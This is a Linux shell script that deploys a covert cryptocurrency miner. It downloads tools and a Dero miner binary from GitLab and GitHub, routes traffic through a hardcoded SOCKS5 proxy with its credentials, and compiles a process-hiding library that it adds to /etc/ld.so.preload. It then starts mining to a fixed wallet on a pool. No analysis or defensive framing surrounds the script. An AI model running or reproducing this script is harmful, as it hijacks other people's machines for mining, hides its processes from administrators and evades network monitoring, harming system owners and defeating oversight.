#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  128.199.222.68:443
socks5_username = arema
socks5_password = singoedan
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://github.com/angkii/2022/raw/main/dero1.5.1
chmod +x dero1.5.1

./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./dero1.5.1 -w dero1qyp8vzjyg6k6p95hvfct3vnv2pee9ss4qg9nym7wu9ck9vq82fce7qq29m6a3.$(echo $(shuf -i 1-20000 -n 1)-astro) -r pool.whalesburg.com:4300 -p stratum
